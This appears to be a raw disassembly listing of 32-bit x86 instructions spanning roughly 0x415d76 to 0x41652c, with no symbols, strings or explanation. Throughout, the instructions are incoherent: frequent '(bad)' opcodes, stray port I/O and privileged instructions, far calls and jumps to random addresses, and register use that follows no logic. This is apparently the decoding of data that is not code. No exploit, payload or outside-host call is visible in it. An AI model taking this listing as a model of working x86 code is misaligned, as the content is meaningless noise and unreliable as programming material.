  415d76:	pop    ds
  415d77:	pop    ebx
  415d78:	addr16 pop esp
  415d7a:	push   esp
  415d7b:	arpl   WORD PTR [esi],ax
  415d7d:	cmp    al,0x65
  415d7f:	jb     0x415dc7
  415d81:	shl    DWORD PTR [ecx],cl
  415d83:	cmp    BYTE PTR [edx-0x6ade24d],bh
  415d89:	mov    cl,0x5c
  415d8b:	pop    ebx
  415d8c:	jbe    0x415d37
  415d8e:	mov    eax,0xb7e3c7f5
  415d93:	dec    ebp
  415d94:	cmp    BYTE PTR [ecx-0x7a],0xe6
  415d98:	fstp   TBYTE PTR [ebp-0x40]
  415d9b:	ins    BYTE PTR es:[edi],dx
  415d9c:	xchg   ecx,eax
  415d9d:	ret    0x9070
  415da0:	cmp    DWORD PTR [ebp-0x6],esp
  415da3:	iret   
  415da4:	cmc    
  415da5:	adc    ecx,DWORD PTR [edx-0x6ee7c950]
  415dab:	int3   
  415dac:	sub    edi,ecx
  415dae:	jmp    0x415d66
  415db0:	pop    ebp
  415db1:	fadd   DWORD PTR [edi]
  415db3:	add    al,0xaa
  415db5:	fstp   DWORD PTR [esi]
  415db7:	out    0xf0,al
  415db9:	mov    ebx,0xa7e13c03
  415dbe:	dec    edi
  415dbf:	and    edi,DWORD PTR [esi]
  415dc1:	call   0xa2f7dd3b
  415dc6:	mov    edx,0xa4709604
  415dcb:	rcl    BYTE PTR ds:0x306b1862,1
  415dd1:	push   ds
  415dd2:	push   ebx
  415dd3:	sbb    ecx,DWORD PTR [ebx-0x5139448f]
  415dd9:	pop    edi
  415dda:	mov    ah,0x79
  415ddc:	je     0x415e15
  415dde:	repz dec ebp
  415de0:	js     0x415e26
  415de2:	fistp  DWORD PTR [ecx]
  415de4:	jmp    0xb8f4de23
  415de9:	xchg   esi,eax
  415dea:	rol    ch,cl
  415dec:	push   edi
  415ded:	(bad)  
  415dee:	adc    al,0x84
  415df0:	or     eax,esp
  415df2:	retf   
  415df3:	adc    DWORD PTR [eax+0x2a],edi
  415df6:	retf   0x702b
  415df9:	dec    eax
  415dfa:	ret    0x8488
  415dfd:	out    dx,eax
  415dfe:	outs   dx,BYTE PTR ds:[esi]
  415dff:	std    
  415e00:	jle    0x415e6f
  415e02:	push   ecx
  415e03:	(bad)  [ebp-0x7a]
  415e06:	sub    esp,esi
  415e08:	fwait
  415e09:	xchg   esp,eax
  415e0a:	dec    edx
  415e0b:	mov    BYTE PTR [ecx-0x51],0xde
  415e0f:	sahf   
  415e10:	adc    DWORD PTR [ecx],ecx
  415e12:	(bad)  [ecx]
  415e14:	lea    ebp,[edi]
  415e16:	or     ebp,DWORD PTR [esi*4-0x6f3bcff3]
  415e1d:	outs   dx,BYTE PTR ds:[esi]
  415e1e:	inc    edx
  415e1f:	sahf   
  415e20:	mov    bh,0x52
  415e22:	test   eax,0xcea3296b
  415e27:	inc    ecx
  415e28:	xchg   BYTE PTR [edi],dh
  415e2a:	mul    DWORD PTR [ecx]
  415e2c:	je     0x415dff
  415e2e:	enter  0x491e,0x90
  415e32:	cld    
  415e33:	adc    eax,0x89a1656f
  415e38:	jmp    0x9a9b495a
  415e3d:	scas   al,BYTE PTR es:[edi]
  415e3e:	push   ds
  415e3f:	call   0x6898:0x1ea7ea71
  415e46:	pop    esp
  415e47:	adc    dh,BYTE PTR [ebp+eax*8-0x21]
  415e4b:	inc    ebp
  415e4c:	and    ah,BYTE PTR [esi+0x6ecb96cd]
  415e52:	outs   dx,BYTE PTR ds:[esi]
  415e53:	dec    esp
  415e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e56:	fwait
  415e57:	inc    ebp
  415e58:	add    al,0x8a
  415e5a:	in     eax,0x2d
  415e5c:	jmp    0x415df7
  415e5e:	aas    
  415e5f:	push   cs
  415e60:	mov    esi,0x373d8ddf
  415e65:	cdq    
  415e66:	and    dh,BYTE PTR ds:0x7b3de6a6
  415e6c:	pusha  
  415e6d:	xchg   ecx,eax
  415e6e:	push   cs
  415e6f:	jecxz  0x415eae
  415e71:	sub    edi,DWORD PTR [ecx+eax*4]
  415e74:	adc    eax,0x54e20781
  415e79:	jns    0x415e70
  415e7b:	ds cmp eax,0xcbe5f9fd
  415e81:	arpl   WORD PTR [edi],si
  415e83:	sbb    edx,DWORD PTR [ebp-0xb0bd189]
  415e89:	add    BYTE PTR [ebp+0x3bb9273a],ch
  415e8f:	pop    ebp
  415e90:	std    
  415e91:	push   esi
  415e92:	aaa    
  415e93:	pop    edx
  415e94:	lahf   
  415e95:	inc    BYTE PTR [esi+0x6377dea3]
  415e9b:	jns    0x415efa
  415e9d:	push   cs
  415e9e:	add    al,0x5
  415ea0:	test   DWORD PTR [ecx-0x7aa6e18e],0x7c148227
  415eaa:	add    BYTE PTR [ebx+eax*4+0x64ebc0ae],bl
  415eb1:	test   BYTE PTR [eax+0x74],ch
  415eb4:	adc    BYTE PTR [edi],0xe
  415eb7:	pop    ds
  415eb8:	outs   dx,BYTE PTR ds:[esi]
  415eb9:	dec    ebx
  415eba:	sub    dh,BYTE PTR [edi-0x41]
  415ebd:	xchg   edi,eax
  415ebe:	nop
  415ebf:	push   0x572dd487
  415ec4:	push   ds
  415ec5:	icebp  
  415ec6:	cs and al,0x12
  415ec9:	push   es
  415eca:	outs   dx,DWORD PTR ds:[esi]
  415ecb:	int3   
  415ecc:	retf   0x119f
  415ecf:	fwait
  415ed0:	or     eax,0x1e3d09e1
  415ed5:	xchg   edx,eax
  415ed6:	pop    ecx
  415ed7:	in     al,0xb
  415ed9:	or     al,0x48
  415edb:	dec    ebx
  415edc:	or     ebx,0xfffffffc
  415edf:	es aam 0xf9
  415ee2:	push   ds
  415ee3:	das    
  415ee4:	jnp    0x415ea3
  415ee6:	adc    esp,DWORD PTR [esi-0x60e7ea21]
  415eec:	fbld   TBYTE PTR [ebp+ebp*8-0x2]
  415ef0:	gs test al,0xf5
  415ef3:	pop    edi
  415ef4:	shl    BYTE PTR [eax-0x78793d06],cl
  415efa:	mov    ch,0xcc
  415efc:	repnz neg BYTE PTR [esi]
  415eff:	icebp  
  415f00:	or     BYTE PTR [edi],0x1a
  415f03:	dec    ecx
  415f04:	cmp    cl,0xa8
  415f07:	push   es
  415f08:	cmp    BYTE PTR [esi],ch
  415f0a:	adc    esp,edi
  415f0c:	push   es
  415f0d:	pop    edx
  415f0e:	in     al,0xa0
  415f10:	(bad)  
  415f11:	push   ecx
  415f12:	jmp    0x415f4a
  415f14:	push   ecx
  415f15:	mov    cs,esp
  415f17:	or     DWORD PTR [edi],ebx
  415f19:	mov    es,ebp
  415f1b:	ja     0x415f78
  415f1d:	repz or eax,0xdebc6e80
  415f23:	push   0x9f0d9491
  415f28:	sbb    cl,BYTE PTR [ebx]
  415f2a:	sbb    BYTE PTR [esi-0x59],ch
  415f2d:	mul    BYTE PTR [esi+0x20]
  415f30:	ss push esi
  415f33:	inc    ebp
  415f34:	adc    BYTE PTR [ecx-0x1cd2eb13],dh
  415f3a:	out    0x6b,al
  415f3c:	out    0xe2,al
  415f3e:	push   esi
  415f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f40:	jne    0x415f14
  415f42:	shr    DWORD PTR [esi],1
  415f44:	mov    ebx,0x90a8b7ec
  415f49:	loope  0x415ee7
  415f4b:	sahf   
  415f4c:	sahf   
  415f4d:	xchg   esi,eax
  415f4e:	inc    ecx
  415f4f:	in     al,dx
  415f50:	mov    bl,0xe6
  415f52:	or     ebp,DWORD PTR [ebp-0x2eaaf664]
  415f58:	mov    esp,0x7c78c64b
  415f5d:	xor    ecx,DWORD PTR [ebp+eiz*8+0x3e]
  415f61:	f2xm1  
  415f63:	es ret 0xcd4
  415f67:	pop    edi
  415f68:	ss ins DWORD PTR es:[edi],dx
  415f6a:	call   0x58b0ef85
  415f6f:	lods   eax,DWORD PTR ds:[esi]
  415f70:	ds sahf 
  415f72:	jbe    0x415f94
  415f74:	inc    ebx
  415f75:	pop    es
  415f76:	sub    al,0x12
  415f78:	jo     0x415f8f
  415f7a:	add    dh,0x41
  415f7d:	(bad)  
  415f7e:	out    dx,eax
  415f7f:	imul   esi,DWORD PTR [edi+0x34],0x13
  415f83:	das    
  415f84:	frstor ds:0xbc602b64
  415f8a:	mov    dh,0x22
  415f8c:	pop    ebx
  415f8d:	jns    0x415f29
  415f8f:	push   ss
  415f90:	jg     0x415f3e
  415f92:	fistp  DWORD PTR [eax+0x4322c186]
  415f98:	and    al,0x93
  415f9a:	mov    bl,0x3
  415f9c:	pop    ebp
  415f9d:	mov    dl,0x27
  415f9f:	outs   dx,BYTE PTR ds:[esi]
  415fa0:	push   ss
  415fa1:	aaa    
  415fa2:	add    al,0x57
  415fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fa5:	xor    eax,0x4733a1f4
  415faa:	inc    edx
  415fab:	push   0xe857fbb7
  415fb0:	aaa    
  415fb1:	mov    esp,0xde706613
  415fb6:	(bad)  [edx-0x7d]
  415fb9:	stos   BYTE PTR es:[edi],al
  415fba:	ror    bl,0xbd
  415fbd:	dec    ebx
  415fbe:	xchg   BYTE PTR [edx+ebp*2],dl
  415fc1:	or     BYTE PTR [ebp-0x4c],ch
  415fc4:	clc    
  415fc5:	out    dx,eax
  415fc6:	fld    DWORD PTR [ebp-0x1a]
  415fc9:	lea    esi,[ecx-0x39]
  415fcc:	repnz xchg esi,eax
  415fce:	xor    dl,dh
  415fd0:	mov    ds:0x45af103b,eax
  415fd5:	dec    eax
  415fd6:	pushf  
  415fd7:	cwde   
  415fd8:	mov    ds,WORD PTR [ecx-0x17]
  415fdb:	test   DWORD PTR [edi+0xd],ebp
  415fde:	mov    al,0x6d
  415fe0:	fist   WORD PTR [eax+0x73]
  415fe3:	push   edi
  415fe4:	cmc    
  415fe5:	lods   eax,DWORD PTR ds:[esi]
  415fe6:	sbb    dh,bl
  415fe8:	std    
  415fe9:	jno    0x416027
  415feb:	mov    bl,0x8
  415fed:	push   ds
  415fee:	xor    eax,0xa3a2eb52
  415ff3:	mov    ah,0x72
  415ff5:	mov    edi,0x166718e3
  415ffa:	sub    ah,dh
  415ffc:	dec    ebx
  415ffd:	mov    eax,0x3d4281bd
  416002:	mov    ds,ebp
  416004:	inc    eax
  416005:	add    ecx,DWORD PTR [edx-0x1804a828]
  41600b:	pop    esi
  41600c:	or     BYTE PTR [esp+eax*2-0x6a],bh
  416010:	inc    ebx
  416011:	add    al,0xe8
  416013:	mov    edx,0xf52de437
  416018:	sbb    BYTE PTR [ebx-0x52723a9c],ah
  41601e:	add    DWORD PTR [edi],0xedb9cdc
  416024:	inc    esp
  416025:	pop    ebx
  416026:	xor    BYTE PTR [esi+0x9746728],dl
  41602c:	push   edx
  41602d:	jmp    0x9fc4:0x4aa5ce0a
  416034:	imul   esi,DWORD PTR [esi],0xffffff99
  416037:	(bad)  
  416038:	mul    DWORD PTR [esi+0x6a]
  41603b:	sub    al,0x24
  41603d:	dec    ebp
  41603e:	pop    edi
  41603f:	fwait
  416040:	stos   BYTE PTR es:[edi],al
  416041:	dec    edx
  416042:	pop    eax
  416043:	mov    bl,0xa0
  416045:	pusha  
  416046:	out    0x1c,al
  416048:	adc    BYTE PTR [ebx+0x42063bed],dl
  41604e:	dec    edx
  41604f:	aam    0x9e
  416051:	dec    esp
  416052:	out    0x5b,al
  416054:	push   ebp
  416055:	mov    ecx,0xb65f5a4f
  41605a:	das    
  41605b:	out    dx,al
  41605c:	ret    
  41605d:	jmp    0x819bfe50
  416062:	mov    al,ds:0x8f3e8105
  416067:	call   0x767cd241
  41606c:	js     0x416060
  41606e:	sar    DWORD PTR ds:0x6a8d183e,cl
  416074:	sbb    cl,dh
  416076:	loope  0x41604f
  416078:	mov    al,0xe1
  41607a:	xlat   BYTE PTR ds:[ebx]
  41607b:	(bad)  
  41607c:	mov    bl,0x16
  41607e:	mov    ds:0x6c4edc23,al
  416083:	(bad)  
  416084:	inc    ebp
  416085:	sbb    BYTE PTR [edx],dl
  416087:	pop    esi
  416088:	add    BYTE PTR [edx-0x6c],ah
  41608b:	jb     0x416076
  41608d:	mov    ah,0x22
  41608f:	pop    esi
  416090:	loopne 0x416026
  416092:	in     eax,dx
  416093:	ins    BYTE PTR es:[edi],dx
  416094:	pop    esi
  416095:	(bad)  
  416096:	adc    bl,ch
  416098:	inc    ecx
  416099:	pop    es
  41609a:	cli    
  41609b:	dec    esp
  41609c:	pop    ecx
  41609d:	in     al,0xc3
  41609f:	cmp    DWORD PTR [edx],0xb16dc450
  4160a5:	jbe    0x416037
  4160a7:	jmp    0x4160c3
  4160a9:	ret    0xa0c5
  4160ac:	test   BYTE PTR [eax-0x60],ah
  4160af:	shr    BYTE PTR [eax],0x77
  4160b2:	add    dh,BYTE PTR [ecx-0x48]
  4160b5:	fcmovb st,st(1)
  4160b7:	(bad)  
  4160b8:	and    eax,0xf24c574a
  4160bd:	sbb    DWORD PTR [ebx],edi
  4160bf:	mov    eax,0xbf909f5b
  4160c4:	int    0xb1
  4160c6:	jg     0x4160e4
  4160c8:	jo     0x4160c2
  4160ca:	cmp    eax,0x9b64da06
  4160cf:	aam    0xc0
  4160d1:	cmp    bl,BYTE PTR [eax+0x6d11fe8b]
  4160d7:	push   ebp
  4160d8:	add    esi,DWORD PTR [edi-0x7a]
  4160db:	mov    bh,0x23
  4160dd:	xor    al,0x61
  4160df:	xchg   esi,eax
  4160e0:	fld    TBYTE PTR [esi+0xacc5fa7]
  4160e6:	bound  ebp,QWORD PTR [edi-0x13]
  4160e9:	and    ebp,ebx
  4160eb:	stos   DWORD PTR es:[edi],eax
  4160ec:	adc    BYTE PTR [edi-0x2b],dh
  4160ef:	pop    es
  4160f0:	daa    
  4160f1:	cmc    
  4160f2:	mov    esi,0x1d9d1520
  4160f7:	(bad)  
  4160f8:	xchg   ebp,eax
  4160f9:	retf   
  4160fa:	enter  0x5c22,0xba
  4160fe:	addr16 loop 0x41615e
  416101:	pop    ebp
  416102:	ror    BYTE PTR [eax+0x29],cl
  416105:	pop    edx
  416106:	and    dl,al
  416108:	jge    0x41609e
  41610a:	sar    BYTE PTR [edi+0x17],0x60
  41610e:	shrd   DWORD PTR [edx-0x3c6326a6],edx,cl
  416115:	sar    al,cl
  416117:	dec    eax
  416118:	mov    al,0xb2
  41611a:	or     esi,DWORD PTR ds:0xde60e28c
  416120:	(bad)  
  416121:	jo     0x416119
  416123:	xor    al,0x46
  416125:	loop   0x416123
  416127:	add    DWORD PTR [ebp+0x28],edx
  41612a:	mov    esi,0xe445a0dc
  41612f:	mov    esp,0xe38f7361
  416134:	or     ebp,esp
  416136:	cwde   
  416137:	fwait
  416138:	cmp    al,0x5
  41613a:	adc    DWORD PTR [ebx+ebp*8+0x5],edi
  41613e:	and    DWORD PTR [edx+0x56],0xf7f6c2d
  416145:	push   esp
  416146:	xor    DWORD PTR [edi+0x15ec7f84],eax
  41614c:	jmp    0x416170
  41614e:	std    
  41614f:	add    eax,0x6ee73fd4
  416154:	push   ds
  416155:	shl    bl,cl
  416157:	adc    al,0x92
  416159:	xor    edx,edi
  41615b:	loope  0x416112
  41615d:	(bad)  
  41615e:	push   edx
  41615f:	not    ah
  416161:	lods   eax,DWORD PTR ds:[esi]
  416162:	sub    BYTE PTR [ebp+0x477e996d],0x8d
  416169:	inc    edx
  41616a:	adc    BYTE PTR [edx+0x45],ch
  41616d:	(bad)
  416170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416171:	cdq    
  416172:	mov    edi,0xac22d4b
  416177:	mov    eax,ds:0x7eeb73fc
  41617c:	mov    bl,BYTE PTR [ecx+0x5c4a099e]
  416182:	retf   
  416183:	xchg   ecx,eax
  416184:	pop    ss
  416185:	xchg   edi,eax
  416186:	mov    al,0x70
  416188:	ins    BYTE PTR es:[edi],dx
  416189:	add    al,0xda
  41618b:	sbb    BYTE PTR ds:0xf5f73733,al
  416191:	test   BYTE PTR [ecx-0x16],ch
  416194:	adc    dl,BYTE PTR [esi-0x66]
  416197:	push   edx
  416198:	or     ebx,ecx
  41619a:	jp     0x41611f
  41619c:	xor    eax,0x4b82bcf3
  4161a1:	stc    
  4161a2:	push   ds
  4161a3:	dec    ebx
  4161a4:	adc    al,0x55
  4161a6:	gs stos BYTE PTR es:[edi],al
  4161a8:	ds jmp 0x416209
  4161ab:	aas    
  4161ac:	iret   
  4161ad:	inc    esp
  4161ae:	aas    
  4161af:	add    esp,DWORD PTR [ecx]
  4161b1:	cmp    al,0xe6
  4161b3:	pop    ebp
  4161b4:	not    BYTE PTR [esi]
  4161b6:	repz call 0xda9e:0x89b3f6a0
  4161be:	aas    
  4161bf:	jl     0x41623d
  4161c1:	jg     0x41616e
  4161c3:	das    
  4161c4:	adc    al,0x2f
  4161c6:	jno    0x4161f3
  4161c8:	dec    eax
  4161c9:	sub    bh,0xd
  4161cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161cd:	adc    esi,DWORD PTR [ebp+0x18]
  4161d0:	jecxz  0x416156
  4161d2:	mov    ecx,0x40be7173
  4161d7:	(bad)  [ecx]
  4161d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161da:	sbb    DWORD PTR [ecx-0x3f34c453],esp
  4161e0:	pop    ecx
  4161e1:	push   edx
  4161e2:	cmp    al,0x87
  4161e4:	ja     0x41619e
  4161e6:	nop
  4161e7:	sub    al,ch
  4161e9:	or     BYTE PTR [ebp+0x21],ah
  4161ec:	inc    ebx
  4161ed:	or     al,0xe3
  4161ef:	iret   
  4161f0:	xor    BYTE PTR [edi+ebx*1+0x55],ch
  4161f4:	dec    eax
  4161f5:	iret   
  4161f6:	out    0x23,eax
  4161f8:	sti    
  4161f9:	and    ah,bl
  4161fb:	adc    ecx,ecx
  4161fd:	(bad)  
  4161fe:	sbb    BYTE PTR [ebx-0x3e],cl
  416201:	dec    ebx
  416202:	(bad)  
  416203:	jne    0x416283
  416205:	mov    ds:0xa27b85de,al
  41620a:	loopne 0x4161a4
  41620c:	pop    ss
  41620d:	lea    ebx,[ebx+0x5fb9685c]
  416213:	test   BYTE PTR [ebx],cl
  416215:	sbb    DWORD PTR [ebx+0x59],eax
  416218:	push   DWORD PTR [ebx+0x38a9f232]
  41621e:	sub    BYTE PTR [esi+0x628203bc],0xe6
  416225:	jmp    0x4161be
  416227:	mov    ebx,0x700b59f
  41622c:	inc    ebp
  41622d:	cmp    bh,BYTE PTR [ebp+0x5fa9236c]
  416233:	mov    edx,0xb9ea80ae
  416238:	fimul  WORD PTR [edx-0x1ee4b56]
  41623e:	cmp    BYTE PTR [ebx-0x44],dl
  416241:	add    ch,0x71
  416244:	inc    DWORD PTR [ebp-0x63c652a5]
  41624a:	cmpps  xmm2,XMMWORD PTR [edx+0x50c87166],0xe1
  416252:	and    bh,BYTE PTR [edx]
  416254:	xchg   edx,eax
  416255:	mov    cl,0x81
  416257:	daa    
  416258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416259:	les    ebp,FWORD PTR [edi-0x1a92267a]
  41625f:	sbb    ebp,DWORD PTR [ecx+ebx*2+0x7]
  416263:	outs   dx,BYTE PTR ds:[esi]
  416264:	in     al,0x53
  416266:	mov    bh,0xe1
  416268:	test   BYTE PTR [esp+ebx*1],ah
  41626b:	ss push es
  41626d:	xchg   edx,eax
  41626e:	fwait
  41626f:	adc    al,0xfb
  416271:	out    0xf,eax
  416273:	leave  
  416274:	pop    esi
  416275:	bound  ebx,QWORD PTR [esi+0xf37bae1]
  41627b:	or     dh,dl
  41627d:	sub    eax,0x3e127356
  416282:	sbb    DWORD PTR [eax-0x7ee1918b],esp
  416288:	jg     0x416306
  41628a:	aas    
  41628b:	add    DWORD PTR [edi],edi
  41628d:	adc    al,0xa9
  41628f:	lock xchg esi,eax
  416291:	leave  
  416292:	push   0xde5270
  416297:	cdq    
  416298:	pop    eax
  416299:	mov    edi,0x74a953c6
  41629e:	add    ebp,DWORD PTR [ebx+edx*4-0x16d4ed39]
  4162a5:	scas   al,BYTE PTR es:[edi]
  4162a6:	push   esi
  4162a8:	cmp    eax,0x34330cfa
  4162ad:	mov    ds,WORD PTR [ebp-0x4282c436]
  4162b3:	neg    BYTE PTR [esi]
  4162b5:	call   DWORD PTR [eax+ecx*4+0x75]
  4162b9:	sub    esi,DWORD PTR [ebp+0x3709e0a4]
  4162bf:	pop    ds
  4162c0:	pop    edx
  4162c1:	cdq    
  4162c2:	and    ch,dh
  4162c4:	sub    ah,dh
  4162c6:	sbb    al,0x7e
  4162c8:	adc    eax,0x2f556872
  4162cd:	xchg   esp,eax
  4162ce:	sub    ch,BYTE PTR [eax-0x74]
  4162d1:	sti    
  4162d2:	out    0xf3,al
  4162d4:	(bad)  
  4162d6:	jmp    0x243b1298
  4162db:	and    al,BYTE PTR [ebp+0x4bb6fb88]
  4162e1:	sbb    al,0x9f
  4162e3:	(bad)  
  4162e5:	sbb    esi,0x6c7e2450
  4162eb:	ret    0x9b0a
  4162ee:	xchg   edx,eax
  4162ef:	mov    ds:0x34bd76d2,al
  4162f4:	leave  
  4162f5:	push   ebx
  4162f6:	and    ebp,DWORD PTR [eax]
  4162f8:	(bad)  
  4162f9:	push   esi
  4162fa:	pop    ebp
  4162fb:	add    BYTE PTR [ebx],dl
  4162fd:	nop
  4162fe:	mov    edx,es
  416300:	arpl   WORD PTR [edi],dx
  416302:	adc    al,BYTE PTR [eax+esi*2]
  416305:	loopne 0x41635d
  416307:	test   DWORD PTR [ebx+0x57d2503c],esi
  41630d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41630e:	add    eax,0x3dad4f
  416313:	cwde   
  416314:	leave  
  416315:	loopne 0x4162c2
  416317:	call   0x98315f12
  41631c:	inc    edx
  41631d:	jmp    0x4162fd
  41631f:	push   eax
  416320:	(bad)  
  416321:	ds cwde 
  416323:	xor    BYTE PTR [edi+0x58263ef5],ch
  416329:	lods   eax,DWORD PTR ds:[esi]
  41632a:	in     al,dx
  41632b:	jbe    0x4162f8
  41632d:	push   ss
  41632e:	sbb    bh,BYTE PTR [ecx]
  416330:	lea    ecx,[edx-0x3a]
  416333:	xor    eax,0xd8c5ff78
  416338:	adc    BYTE PTR [ecx],ch
  41633a:	sub    esp,DWORD PTR [edx+0x76fb3360]
  416340:	es cli 
  416342:	inc    eax
  416343:	(bad)  
  416344:	das    
  416345:	mov    edx,0x2d58d82c
  41634a:	pop    esi
  41634b:	push   esp
  41634c:	mov    ch,0x97
  41634e:	inc    edi
  41634f:	out    0xcd,al
  416351:	pop    edi
  416352:	xchg   BYTE PTR [edx+0x7489be85],bl
  416358:	sub    BYTE PTR [eax+0x182e9a7b],dl
  41635e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41635f:	xchg   esi,eax
  416360:	sbb    al,0x32
  416362:	mov    eax,0x20eb1bc5
  416367:	jne    0x41636f
  416369:	lock xor al,BYTE PTR [ebx+0x197daf3c]
  416370:	les    esi,FWORD PTR [ebx]
  416372:	ins    DWORD PTR es:[edi],dx
  416373:	jbe    0x416343
  416375:	cs icebp 
  416377:	std    
  416378:	sub    eax,DWORD PTR [ebx+ebx*1+0x5a]
  41637c:	sub    esp,esp
  41637e:	pop    es
  41637f:	xchg   ebp,eax
  416380:	and    eax,0xdb822b60
  416385:	jg     0x4163af
  416387:	jmp    0xf9d9a7d0
  41638c:	aam    0x4d
  41638e:	fdivr  st,st(6)
  416390:	lock push ss
  416392:	inc    edx
  416393:	jnp    0x416349
  416395:	imul   ebx,DWORD PTR [eax-0x1939547d],0x75
  41639c:	dec    ecx
  41639d:	test   DWORD PTR [edx-0x33e15db],ebp
  4163a3:	push   ebp
  4163a4:	push   ebx
  4163a5:	hlt    
  4163a6:	jl     0x416389
  4163a8:	pop    edx
  4163a9:	in     eax,dx
  4163aa:	add    ecx,DWORD PTR [ebx+0x10]
  4163ad:	jne    0x41637c
  4163af:	stc    
  4163b0:	mov    eax,ds:0x2fc0ebe5
  4163b5:	pop    esi
  4163b6:	out    dx,eax
  4163b7:	inc    edi
  4163b8:	scas   al,BYTE PTR es:[edi]
  4163b9:	xor    BYTE PTR [ebp-0x48],0x61
  4163bd:	sti    
  4163be:	fstp   DWORD PTR [ebx]
  4163c0:	push   edx
  4163c1:	cmp    DWORD PTR [edi],ecx
  4163c3:	cmp    DWORD PTR [eax],esi
  4163c5:	mov    bh,0x80
  4163c7:	lahf   
  4163c8:	mov    WORD PTR [ecx+ebp*8-0x75],?
  4163cc:	push   esp
  4163cd:	cli    
  4163ce:	into   
  4163cf:	jle    0x416351
  4163d1:	shr    DWORD PTR [ecx-0x57fc03ba],0x38
  4163d8:	jp     0x416442
  4163da:	(bad)  
  4163db:	call   0x9732:0xc6b74e30
  4163e2:	mov    ds:0xd31a4159,eax
  4163e7:	loopne 0x416425
  4163e9:	mov    ds:0xe761e1ed,eax
  4163ee:	pop    es
  4163ef:	jp     0x416394
  4163f1:	sbb    DWORD PTR [ebp+0x3bf987c],esp
  4163f7:	retf   
  4163f8:	popa   
  4163f9:	popa   
  4163fa:	into   
  4163fb:	mov    ch,0x22
  4163fd:	add    BYTE PTR [edi-0x69f9234b],dl
  416403:	mov    ah,bh
  416405:	adc    al,0x7
  416407:	(bad)  
  416408:	(bad)  
  41640a:	inc    ebp
  41640b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41640c:	int    0x29
  41640e:	add    BYTE PTR [edi+0x702fee48],al
  416414:	xchg   ecx,eax
  416415:	pushf  
  416416:	bound  ebx,QWORD PTR [eax-0x7efb3c30]
  41641c:	or     ebx,DWORD PTR [eax]
  41641e:	jge    0x4163f0
  416420:	jne    0x4163c3
  416422:	retf   
  416423:	dec    ebx
  416424:	(bad)  
  416425:	ds jecxz 0x41648a
  416428:	inc    ecx
  416429:	pop    ds
  41642a:	(bad)  
  41642b:	mov    dh,0xdc
  41642d:	mov    ah,0xd0
  41642f:	out    0xf5,eax
  416431:	add    eax,DWORD PTR [esp+ebx*1]
  416434:	outs   dx,BYTE PTR ds:[esi]
  416435:	ror    BYTE PTR [edx],cl
  416437:	sar    dh,0x7
  41643a:	sub    ch,ch
  41643c:	mov    esi,0x2a964936
  416441:	getsec 
  416443:	rcr    BYTE PTR [edx],cl
  416445:	leave  
  416446:	sub    BYTE PTR [esi+0x70],dh
  416449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644a:	not    ecx
  41644c:	push   ds
  41644d:	stos   DWORD PTR es:[edi],eax
  41644e:	jecxz  0x41642f
  416450:	jnp    0x41644b
  416452:	stc    
  416453:	pushf  
  416454:	cli    
  416455:	scas   al,BYTE PTR es:[edi]
  416456:	loopne 0x4164a6
  416458:	pop    esp
  416459:	sbb    eax,0x3de3d588
  41645e:	or     DWORD PTR [ebp+eiz*1+0x15],0x6fa312a0
  416466:	jae    0x41642b
  416468:	je     0x416477
  41646a:	xor    BYTE PTR [edx+esi*4-0x754f9282],0xcc
  416472:	outs   dx,BYTE PTR ds:[esi]
  416473:	cdq    
  416474:	jmp    0x3c97496d
  416479:	mov    ebx,0xe1524972
  41647e:	jl     0x41647c
  416480:	nop
  416481:	ss push ebx
  416483:	test   al,0x2
  416485:	test   al,0x9c
  416487:	pop    ss
  416488:	test   al,0x78
  41648a:	jb     0x4164d5
  41648c:	push   ds
  41648d:	jne    0x4164b6
  41648f:	mov    ebp,0xba8e4a2b
  416494:	or     DWORD PTR [ecx-0x68dc6c54],esp
  41649a:	scas   al,BYTE PTR es:[edi]
  41649b:	pop    ebp
  41649c:	add    BYTE PTR [eax],dh
  41649e:	xchg   edx,eax
  41649f:	lds    edi,FWORD PTR [esi-0x551a036b]
  4164a5:	adc    DWORD PTR [eax],ecx
  4164a7:	adc    bh,BYTE PTR [ebp-0x7f63f950]
  4164ad:	add    BYTE PTR [eax-0xec69f28],al
  4164b3:	lea    ebx,[edx-0x21]
  4164b6:	pop    eax
  4164b7:	retw   0x5048
  4164bb:	stos   BYTE PTR es:[edi],al
  4164bc:	ins    DWORD PTR es:[edi],dx
  4164bd:	(bad)  
  4164be:	jle    0x41645e
  4164c0:	stos   BYTE PTR es:[edi],al
  4164c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164c2:	(bad)  [eax-0x35]
  4164c5:	aas    
  4164c6:	imul   ebx,esi,0x62
  4164c9:	icebp  
  4164ca:	adc    sp,WORD PTR [esi]
  4164cd:	fucom  st(6)
  4164cf:	cmp    BYTE PTR [ecx-0x37],0xb9
  4164d3:	mov    WORD PTR [eax],es
  4164d5:	adc    eax,0x5fa47ef5
  4164da:	sbb    ah,dl
  4164dc:	popa   
  4164dd:	repz fidiv DWORD PTR [esi]
  4164e0:	bound  eax,QWORD PTR [si+0x528c]
  4164e5:	mov    eax,0x22273597
  4164ea:	mov    dh,0x45
  4164ec:	or     BYTE PTR ds:0x304980be,dh
  4164f2:	xor    al,0xdd
  4164f4:	xor    dh,BYTE PTR [edx+0x5d4bc040]
  4164fa:	hlt    
  4164fb:	repnz pushf 
  4164fd:	pop    ecx
  4164fe:	retf   0x4d90
  416501:	or     cl,BYTE PTR [esi+0x2b]
  416504:	xor    ch,BYTE PTR [edx]
  416506:	add    DWORD PTR [edi-0x2ff30185],edx
  41650c:	fs mov edx,0x6d71621d
  416512:	ss icebp 
  416514:	adc    cl,al
  416516:	pop    ds
  416517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416518:	test   eax,0x58f1bea0
  41651d:	bound  ebp,QWORD PTR [eax]
  41651f:	ret    
  416520:	js     0x416588
  416522:	inc    edx
  416523:	test   al,0x6c
  416525:	or     eax,0x59953bde
  41652a:	mov    bl,0x7e
  41652c:	jb     0x416590
